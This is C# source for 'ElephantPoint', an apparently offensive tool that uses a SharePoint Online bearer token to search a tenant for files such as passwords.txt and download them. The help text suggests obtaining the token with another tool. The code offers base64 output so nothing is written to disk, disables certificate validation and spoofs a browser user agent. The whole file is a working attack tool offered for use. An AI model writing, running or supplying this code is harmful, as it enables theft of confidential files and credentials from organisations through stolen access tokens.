using SearchQueryTool.Helpers;
using SearchQueryTool.Model;
using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace ElephantPoint
{
    class Program
    {
        private static SearchQueryResult StartSearchQueryRequest(SearchQueryRequest request)
        {
            SearchQueryResult searchResults = null;
            try
            {
                HttpRequestResponsePair requestResponsePair = HttpRequestRunner.RunWebRequest(request);
                if (requestResponsePair != null)
                {
                    HttpWebResponse response = requestResponsePair.Item2;
                    if (null != response)
                    {
                        if (!response.StatusCode.Equals(HttpStatusCode.OK))
                        {
                            string status = String.Format("HTTP {0} {1}", (int)response.StatusCode, response.StatusDescription);
                            Console.WriteLine("Request returned with following status: " + status);
                        }
                    }
                }
                searchResults = GetResultItem(requestResponsePair);

                // success, return the results
                return searchResults;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Request failed with exception: " + ex.Message);
            }
            return searchResults;
        }

        private static SearchQueryResult GetResultItem(HttpRequestResponsePair requestResponsePair)
        {
            SearchQueryResult searchResults;
            var request = requestResponsePair.Item1;

            using (var response = requestResponsePair.Item2)
            {
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    var content = reader.ReadToEnd();
                    NameValueCollection requestHeaders = new NameValueCollection();
                    foreach (var header in request.Headers.AllKeys)
                    {
                        requestHeaders.Add(header, request.Headers[header]);
                    }

                    NameValueCollection responseHeaders = new NameValueCollection();
                    foreach (var header in response.Headers.AllKeys)
                    {
                        responseHeaders.Add(header, response.Headers[header]);
                    }

                    string requestContent = "";
                    if (request.Method == "POST")
                    {
                        requestContent = requestResponsePair.Item3;
                    }

                    searchResults = new SearchQueryResult
                    {
                        RequestUri = request.RequestUri,
                        RequestMethod = request.Method,
                        RequestContent = requestContent,
                        ContentType = response.ContentType,
                        ResponseContent = content,
                        RequestHeaders = requestHeaders,
                        ResponseHeaders = responseHeaders,
                        StatusCode = response.StatusCode,
                        StatusDescription = response.StatusDescription,
                        HttpProtocolVersion = response.ProtocolVersion.ToString()
                    };
                    searchResults.Process();
                }
            }
            return searchResults;
        }

        private static void DisplayResults(SearchQueryResult results, int MaxRows)
        {
            if (results != null)
            {
                if (results.PrimaryQueryResult != null)
                {
                    Console.WriteLine("Found " + results.PrimaryQueryResult.TotalRows + " results");
                    if (results.PrimaryQueryResult.TotalRows > MaxRows)
                    {
                        Console.WriteLine("Only showing " + MaxRows + " results, though!");
                    }
                    if (results.PrimaryQueryResult.TotalRows > 0)
                    {
                        foreach (ResultItem item in results.PrimaryQueryResult.RelevantResults)
                        {
                            Console.WriteLine("---");
                            Console.WriteLine("File: " + item.Title + " - Size: " + item.Size + " - Author: " + item.Author + " - CreatedDateTime: " + item.createdDateTime + " - Last Modified Time: " + item.LastModifiedTime);
                            Console.WriteLine(item.Path);
                            Console.WriteLine(item.HitHighlightedSummary.Replace("</c0>", "").Replace("<c0>","").Replace("<ddd/>","").Replace("<ddd>",""));
                        }
                    }
                }
                else
                {
                    Console.WriteLine("Found no results... maybe the request failed?");
                }
            }
            else
            {
                Console.WriteLine("Result are null ! What happened there?");
            }
        }

        private static void DoSingleQuery(string SPOUrl, string token, string query_file, bool isFQL, int MaxRows, string RefinementFilters)
        {
            string SPOURL_f = "https://" + SPOUrl;
            string token_f = "Bearer " + token;
            SearchQueryRequest request = new SearchQueryRequest
            {
                SharePointSiteUrl = SPOURL_f,
                AcceptType = AcceptType.Json,
                Token = token_f,
                AuthenticationType = AuthenticationType.SPOManagement,
                QueryText = query_file,
                HttpMethodType = HttpMethodType.Get,
                EnableFql = isFQL,
                RowLimit = MaxRows
            };
            if (RefinementFilters != null)
            {
                request.RefinementFilters = RefinementFilters;
            }

            SearchQueryResult results = StartSearchQueryRequest(request);
            DisplayResults(results, MaxRows);
        }

        public static void httpRequest(string access_token, string uri, string savelocation, bool b64)
        {
            try
            {
                string token_f = "Bearer " + access_token;
                string fixing_uri = uri.Replace(" ", "%20");
                string[] url_array_fix = fixing_uri.Split('/');
                string url_fix = String.Join("/", url_array_fix, 0, 5) + "/_api/web/GetFileByServerRelativeUrl('/" + String.Join("/", url_array_fix, 3, url_array_fix.Length - 3) + "')/$value";
                Console.WriteLine($"[+] Downloading file: {url_fix}");
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url_fix);
                request.Proxy = WebRequest.GetSystemWebProxy();
                request.Proxy.Credentials = CredentialCache.DefaultCredentials;
                request.ServicePoint.Expect100Continue = false;
                request.Method = "GET";
                request.ContentType = "application/json";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0";
                request.Headers.Add("Authorization", token_f);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                using (var stream = response.GetResponseStream())
                {
                    if (b64)
                    {
                        byte[] bytes;
                        using (var memoryStream = new MemoryStream())
                        {
                            stream.CopyTo(memoryStream);
                            bytes = memoryStream.ToArray();
                        }
                        Console.WriteLine($"[+] Base64 blob: {Convert.ToBase64String(bytes)}");
                    }
                    else
                    {
                        using (var file = File.Open(savelocation, FileMode.Create))
                        {
                            stream.CopyTo(file);
                            stream.Flush();
                        }
                    }
                }
            }
            catch (WebException e)
            {
                if (e.Response is HttpWebResponse httpResponse)
                {
                    Console.WriteLine($"[-] WebException: {e.Message}");
                }
                else
                {
                    Console.WriteLine($"[-] WebException: {e.Message}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error: {e.Message}");
            }
        }

        private static void PrintHelp()
        {
            var Help = "";
            Help += "Usage: ElephantPoint.exe [options]\r\n";
            Help += "    /help            :  show this menu\r\n";
            Help += "    /SPO_url         :  Sharepoint URL ex: expensiverabbit.sharepoint.com\r\n";
            Help += "    /file_url        :  will be obtained from the results of the first example\r\n";
            Help += "    /save_file       :  save file location and name\r\n";
            Help += "    /token           :  access token for SharePoint, can be obtained by ManaCloud\r\n";
            Help += "    /max_row         :  number of rows for results (optional)\r\n";
            Help += "    /fql             :  takes no args, changes the format (optional)\r\n";
            Help += "    /query_file      :  name of file you are looking for\r\n";
            Help += "    /ref_filter      :  filtering results (optional)\r\n";
            Help += "    /b64             :  fetch file as base64 without dropping on disk\r\n";
            Help += "\r\nExample:\r\n";
            Help += "    ElephantPoint.exe /query_file:passwords.txt /SPO_url:expensiverabbit.sharepoint.com /token:ey...\r\n";
            Help += "    ElephantPoint.exe /file_url:https://expensiverabbit.sharepoint.com/.../passwords.txt /save_file:C:\\Users\\public\\test.txt /token:ey...\r\n";
            Help += "    ElephantPoint.exe /file_url:https://expensiverabbit.sharepoint.com/.../passwords.txt /b64 /token:ey...\r\n";
            Console.WriteLine(Help);
        }

        static void Main(string[] args)
        {
            var options = new Options();
            if (options.ParseArguments(args))
            {
                if (options.Help)
                {
                    PrintHelp();
                }
                else
                {

                    System.Net.ServicePointManager.ServerCertificateValidationCallback = ((object z, X509Certificate y, X509Chain x, SslPolicyErrors w) => true);
                    System.Net.ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
                    new WebClient();

                    if (string.IsNullOrEmpty(options.token))
                    {
                        Console.WriteLine("[X] No SharePoint token was provided");
                        return;
                    }
                    else if (!string.IsNullOrEmpty(options.file_url) && (!string.IsNullOrEmpty(options.save_file) || options.b64 == true) && !string.IsNullOrEmpty(options.token))
                    {
                        httpRequest(options.token, options.file_url, options.save_file, options.b64);
                    }
                    else
                    {
                        DoSingleQuery(options.SPO_url, options.token, options.query_file, options.fql, options.max_row, options.ref_filter);
                    }
                }
            }
        }
    }
}
